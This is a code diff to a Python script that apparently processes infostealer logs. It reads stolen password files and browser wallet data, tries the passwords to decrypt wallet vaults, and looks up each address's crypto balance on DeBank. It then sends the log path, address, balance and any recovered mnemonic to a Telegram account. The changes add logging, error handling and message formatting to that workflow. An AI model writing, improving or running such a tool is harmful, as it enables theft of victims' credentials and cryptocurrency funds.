@@ -1,4 +1,5 @@
 import base64
+import datetime
 import hashlib
 import json
 import os
@@ -10,6 +11,15 @@ meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}
 
 with open('config.json', 'r') as fp:
     cfg = json.loads(fp.read())
+
+
+def AddNoteToLog(text):
+    date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    new_text = f'[{date}]: {text}\n'
+    print(new_text)
+    logfile = open("info.txt", "a", encoding="utf-8-sig")
+    logfile.write(new_text)
+    logfile.close()
 
 
 def sendmsg(id, text):
@@ -25,11 +35,14 @@ def sendmsg(id, text):
 
 def check_password(info, passwd):
     import json
-    data = json.loads(info)
-    password = passwd
-    salt = base64.b64decode(data['salt'])
-    vault = base64.b64decode(data['data'])
-    iv = base64.b64decode(data['iv'])
+    try:
+        data = json.loads(info)
+        password = passwd
+        salt = base64.b64decode(data['salt'])
+        vault = base64.b64decode(data['data'])
+        iv = base64.b64decode(data['iv'])
+    except:
+        return None
 
     key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8', 'ignore'), salt, 10000, 32)
 
@@ -50,6 +63,7 @@ def check_password(info, passwd):
 def check_balance():
     global msg
     vault = ""
+    log_path = ""
     addresses1 = []
     used_passes = []
     checked_addresses = []
@@ -82,14 +96,14 @@ def check_balance():
                                     addresses1.append(re.search('0x(.+)":{"(.+)', address.split('":"')[0]).groups()[1])
                                 except:
                                     continue
-                            break
+                            log_path = f"{log}\\Wallets\\{wallet}"
                         else:
                             continue
             else:
                 continue
         mnemonic = ""
         if os.path.exists(f"{os.getcwd()}\\logs\\{log}\\Passwords.txt"):
-            passwords = open(f"{os.getcwd()}\\logs\\{log}\\Passwords.txt", "r")
+            passwords = open(f"{os.getcwd()}\\logs\\{log}\\Passwords.txt", "r", errors='ignore')
             for line in passwords.readlines():
                 if line.__contains__("Password: "):
                     password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
@@ -103,7 +117,7 @@ def check_balance():
         for address in addresses1:
             if address in checked_addresses:
                 continue
-            msg = f"Log: {log}\nAddress: {address}\nBalance: "
+            msg = f"<b>Log: {log_path}</b>\n\nAddress: {address}\nBalance: "
             for site, css in meta_sites.items():
                 req = requests.get(f'https://openapi.debank.com/v1/user/total_balance?id={address}').content
                 try:
@@ -114,6 +128,7 @@ def check_balance():
                 if mnemonic:
                     msg += f"{mnemonic}"
             checked_addresses.append(address)
+            AddNoteToLog("\n" + msg.replace('<b>', '').replace('</b>', '') + "\n")
             sendmsg(cfg[0]['telegram_id'], msg)
 
 
